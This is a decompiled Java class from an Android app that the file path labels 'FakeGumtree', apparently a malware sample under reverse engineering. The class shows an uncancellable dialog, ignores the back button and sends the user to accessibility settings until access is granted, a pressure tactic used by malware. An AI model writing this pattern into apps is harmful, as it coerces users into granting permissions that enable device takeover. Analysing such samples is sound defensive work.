package com.gumsis.ds;

import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.os.Bundle;
import com.gumsis.base.BaseActivity;
import com.gumsis.base.dialog.AlertDialog;
import com.gumsis.base.dialog.AlertDialog.Builder;
import com.gumsis.checktls.ASTls;
import com.gumsis.checktls.ScrTls;

public class StartDialog
  extends BaseActivity
{
  private AlertDialog mDialog;
  
  private void showDialog()
  {
    try
    {
      String str = getString(2131361826) + " " + getString(2131361804);
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setTitle(getString(2131361827)).setMessage(str).setPositiveButton("OK", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          if (!ASTls.isAccessibilitySettingsOn(StartDialog.this))
          {
            StartDialog.this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
            StartDialog.this.destroyDialog(StartDialog.this.mDialog);
          }
        }
      });
      this.mDialog = localBuilder.create();
      this.mDialog.setCancelable(false);
      this.mDialog.setCanceledOnTouchOutside(false);
      this.mDialog.show();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void onBackPressed() {}
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    ScrTls.scrOn(this);
    showDialog();
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    ScrTls.scrOff(this);
  }
  
  protected void onPause()
  {
    super.onPause();
    destroyDialog(this.mDialog);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/ds/StartDialog.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */